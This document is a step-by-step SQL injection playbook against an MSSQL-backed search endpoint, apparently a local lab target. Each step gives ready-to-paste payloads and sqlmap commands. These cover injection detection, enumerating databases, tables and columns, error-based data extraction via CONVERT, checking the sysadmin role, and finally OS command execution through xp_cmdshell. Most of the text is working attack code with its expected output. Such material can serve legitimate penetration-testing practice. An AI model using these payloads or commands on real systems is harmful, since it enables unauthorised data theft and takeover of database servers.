# MSSQL SQLi — Playbook (search by price)

**Target:** `GET /search?price=<PAYLOAD>` (or the search field on `/inventory`).
**Vulnerable parameter:** `price`.
**Server-side query:**

```sql
SELECT TOP 100 price FROM dbo.products
WHERE active = 1 AND CAST(price AS varchar(30)) LIKE '<price>%'
```

**Rules of thumb:**

- Response body is `text/plain`, prices comma-separated (`10,100,101,...`). No rows = empty body.
- Number → `UNION SELECT <num>` returns it directly (200).
- String → `CONVERT(int, <string>)` throws 500, and the message contains the value.
- Boolean: use `=`, not `-` (a hyphen makes `OR 0`, a non-boolean, which errors).
- `STRING_AGG(name,',')` dumps everything at once; `TOP 1 ... ORDER BY` pulls one at a time.

**sqlmap — base for every command:**

```bash
URL="http://localhost:8080/search?price=10"
BASE="sqlmap -u $URL -p price --batch --dbms=mssql"
```

The strong channel here is error-based; add `--technique=E` to force it for extraction.

---

## 1. Initial detection

Burp:

```
10
```

Returns `10,100,101,105,1000,1050` (200). Now a single quote:

```
10'
```

→ 500 `Unclosed quotation mark after the character string...` — the quote breaks the string ⇒ injectable.

sqlmap (full detection of the injection point):

```bash
$BASE
```

## 2. Boolean query — True

Burp:

```
' OR 1=1--
```

→ 200, returns all prices.

## 3. Boolean query — False

Burp:

```
' OR 1=2--
```

→ 200, empty body.

sqlmap (confirm boolean-blind for steps 2–3, `-v3` to show the TRUE/FALSE payloads):

```bash
$BASE --technique=B -v3
```

## 4. Guess the number of columns

Burp:

```
' union select 1--
' union select 1,2--
```

`1` → 200 (works ⇒ one column). `1,2` → 500 `All queries ... must have an equal number of columns` ⇒ one column.

sqlmap (UNION, force a single column):

```bash
$BASE --technique=U --union-cols=1
```

## 5. Identify the user role and the SQL version

Burp — is it sysadmin:

```
' UNION SELECT CAST(IS_SRVROLEMEMBER('sysadmin') AS VARCHAR)--
```

→ returns `1` ⇒ the login is sysadmin (`0`/empty = not).

Burp — the version (`@@version`):

```
' OR 1=CONVERT(int,(SELECT @@version))--
```

→ 500, the message contains `Microsoft SQL Server 2019 ...`.

sqlmap:

```bash
$BASE --is-dba --current-user --banner
```

## 6. List all tables in the database

Burp — all at once:

```
' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.tables))--
```

One at a time:

```
' OR 1=CONVERT(int,(SELECT TOP 1 name FROM sys.tables ORDER BY name))--
```

→ 500, the message contains the table names (e.g. `products`).

sqlmap:

```bash
$BASE -D StoreDb --tables
```

## 7. Identify the current database

Burp:

```
' OR 1=CONVERT(int,(SELECT DB_NAME()))--
```

→ 500 `...converting the varchar value 'StoreDb' to data type int.`

sqlmap:

```bash
$BASE --current-db
```

## 8. List all databases on the server

Burp:

```
' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.databases))--
```

→ 500, contains `master,tempdb,model,msdb,StoreDb`. (One at a time: `SELECT TOP 1 name FROM sys.databases ORDER BY name`.)

sqlmap:

```bash
$BASE --dbs
```

## 9. List all columns of a specific table

Burp — for `dbo.products`:

```
' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM sys.columns WHERE object_id=OBJECT_ID('dbo.products')))--
```

→ 500, contains `id,name,category,price,description,active`.

sqlmap:

```bash
$BASE -D StoreDb -T products --columns
```

## 10. Extract a column from a specific table

Burp — all names from `dbo.products`:

```
' OR 1=CONVERT(int,(SELECT STRING_AGG(name,',') FROM dbo.products))--
```

A single value (e.g. the first):

```
' OR 1=CONVERT(int,(SELECT TOP 1 name FROM dbo.products ORDER BY id))--
```

→ 500, the message contains the values.

sqlmap (dump a column / the whole table):

```bash
$BASE -D StoreDb -T products -C name --dump
$BASE -D StoreDb -T products --dump
```

## 11. RCE (xp_cmdshell)

Burp — see `exploitation-walkthrough.md` (run a command + exfiltrate via the error channel).

sqlmap (stacked queries + sysadmin + xp_cmdshell):

```bash
$BASE --os-shell
$BASE --os-cmd "whoami"
```

---

### Notes

- If `STRING_AGG` returns a string too long and the message is truncated — switch to `TOP 1 ... ORDER BY` + `WHERE name > '<last>'` to page through it.
- The selected column is numeric (`price`), so a UNION of strings gives a generic conversion error; sqlmap simply falls back to error/boolean/time — so `--technique=E` is recommended for extraction.
- The `price` parameter lands inside `LIKE '...'`, so every payload opens with a quote `'` and closes with `--`.
- Run sqlmap from the host that can reach `localhost:8080`.
